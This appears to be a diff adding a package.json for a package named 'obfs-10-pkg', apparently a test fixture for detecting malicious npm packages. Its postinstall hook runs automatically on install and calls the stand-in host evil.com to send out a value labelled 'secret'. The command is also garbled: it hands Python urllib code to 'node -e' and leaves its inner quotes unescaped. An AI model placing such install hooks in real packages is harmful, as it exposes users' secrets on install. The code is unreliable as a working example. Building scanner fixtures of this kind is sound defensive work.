@@ -1,0 +1,7 @@
+{
+  "name": "obfs-10-pkg",
+  "version": "1.0.0",
+  "scripts": {
+    "postinstall": "node -e \"import urllib.request; urllib.request.urlopen(\"http://evil.com/?data=secret\")\""
+  }
+}
